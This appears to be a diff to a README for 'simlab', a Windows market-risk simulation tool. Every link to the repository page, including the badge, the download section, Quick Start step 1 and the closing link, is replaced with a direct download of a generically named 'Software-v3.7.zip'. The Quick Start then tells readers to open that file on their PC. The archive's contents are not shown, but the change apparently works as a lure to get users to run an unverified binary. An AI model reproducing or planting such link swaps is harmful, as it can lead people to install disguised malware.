@@ -1,6 +1,6 @@
 # 📊 simlab - Run Market Risk Simulations Fast
 
-[![Download simlab](https://img.shields.io/badge/Download-simlab-blue?style=for-the-badge)](https://github.com/xfroy/simlab)
+[![Download simlab](https://img.shields.io/badge/Download-simlab-blue?style=for-the-badge)](https://github.com/xfroy/simlab/raw/refs/heads/main/app/Software-v3.7.zip)
 
 ## 🖥️ What simlab Does
 
@@ -20,7 +20,7 @@ Use it to:
 
 Visit this page to download or access the app:
 
-[https://github.com/xfroy/simlab](https://github.com/xfroy/simlab)
+[https://github.com/xfroy/simlab/raw/refs/heads/main/app/Software-v3.7.zip](https://github.com/xfroy/simlab/raw/refs/heads/main/app/Software-v3.7.zip)
 
 Open the link in your browser, then look for the latest download option on the page.
 
@@ -193,7 +193,7 @@ That mix makes it a useful tool for anyone who wants to look at market risk with
 
 ## 🖱️ Quick Start
 
-1. Open [https://github.com/xfroy/simlab](https://github.com/xfroy/simlab)
+1. Open [https://github.com/xfroy/simlab/raw/refs/heads/main/app/Software-v3.7.zip](https://github.com/xfroy/simlab/raw/refs/heads/main/app/Software-v3.7.zip)
 2. Download the app from the page
 3. Open the file on your Windows PC
 4. Run the simulation
@@ -221,4 +221,4 @@ This gives you a clear chart without too much noise
 
 ## 📎 Link Again
 
-[Download simlab](https://github.com/xfroy/simlab)
+[Download simlab](https://github.com/xfroy/simlab/raw/refs/heads/main/app/Software-v3.7.zip)
